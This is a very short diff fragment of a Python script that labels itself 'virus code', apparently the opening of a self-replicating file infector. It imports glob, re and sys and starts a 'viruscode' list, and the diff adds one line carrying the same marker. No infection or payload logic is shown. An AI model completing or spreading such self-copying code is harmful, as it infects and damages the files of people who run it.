@@ -1,4 +1,4 @@
-
+a=1#start of virus code
 #start of virus code
 import glob,re,sys
 viruscode = []
